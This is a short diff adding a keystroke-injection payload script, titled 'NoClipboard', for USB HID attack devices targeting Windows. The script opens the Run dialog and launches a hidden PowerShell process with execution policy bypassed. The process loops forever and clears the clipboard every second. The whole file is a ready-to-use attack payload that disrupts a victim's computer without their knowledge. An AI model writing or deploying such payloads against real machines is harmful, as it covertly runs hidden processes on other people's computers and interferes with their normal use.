@@ -1,0 +1,10 @@
+REM Title: NoClipboard
+REM Author: dsymbol
+REM Description: Hidden PowerShell that continuously monitors the clipboard and resets it to an empty value whenever it detects that the clipboard has been modified
+REM Target: Windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass while(1){if(Get-Clipboard){Set-Clipboard};sleep -Seconds 1}
+ENTER
